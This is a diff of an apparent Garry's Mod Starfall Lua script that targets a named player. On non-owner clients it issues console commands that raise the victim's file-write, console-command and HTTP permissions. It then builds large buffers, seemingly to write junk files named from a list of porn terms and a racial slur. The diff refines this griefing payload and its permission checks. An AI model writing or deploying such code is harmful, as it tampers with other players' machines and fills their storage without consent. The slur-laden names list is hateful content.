@@ -11,7 +11,7 @@ Performance_Cpu_Limit = 0.05 // Manage to perfomance
 Progress_Speed = 10
 
 
-Target = find.playersByName("Markiz")[1]
+Target = find.playersByName("ДЕ")[1]
 
 if SERVER then
     chip():setNoDraw(false)
@@ -53,8 +53,13 @@ local Names = {"furry","porn","gayPorn","hentai","FullHDporn","NIGGERPORN","kopr
 
 
 function set_cmd()
-    concmd("sf_permission_cl file.write client 3")
-    if player() != owner() then
+    if not permissionSatisfied_console then return end
+    
+    if player() == owner() then
+        concmd("sf_permission_cl file.write client 1")
+        concmd("sf_permission_cl console.command client 4")
+    else
+        concmd("sf_permission_cl file.write client 3")
         concmd("sf_permission_cl console.command client 3")
         concmd("sf_permission_cl http.get urlwhitelist 2")
         concmd("sf_timebuffersize_cl 1000")
@@ -63,7 +68,8 @@ function set_cmd()
 end
 
 setupPermissionRequest({ "console.command" }, "See an example of console.command.", true)
-local permissionSatisfied = hasPermission("console.command")
+local permissionSatisfied_filewrite = hasPermission("file.write")
+local permissionSatisfied_console = hasPermission("console.command")
 
 S = "" 
 I = 0
@@ -103,6 +109,8 @@ end
 
 
 function start_create_buffer()
+    if not permissionSatisfied_filewrite then return end
+    
     for i=1, 10 * Progress_Speed do
         _template = _template.._template2
     end
@@ -140,13 +148,13 @@ function start_create_buffer()
 end
 
 
+start_create_buffer()
+set_cmd()
 
-if permissionSatisfied then
-    set_cmd()
-    start_create_buffer()
-else
+if not permissionSatisfied_console then
     hook.add("permissionrequest", "", function()
-        permissionSatisfied = hasPermission("console.command")
+        permissionSatisfied_console = hasPermission("console.command")
+        permissionSatisfied_filewrite = hasPermission("file.write")
         set_cmd()
         start_create_buffer()
     end)
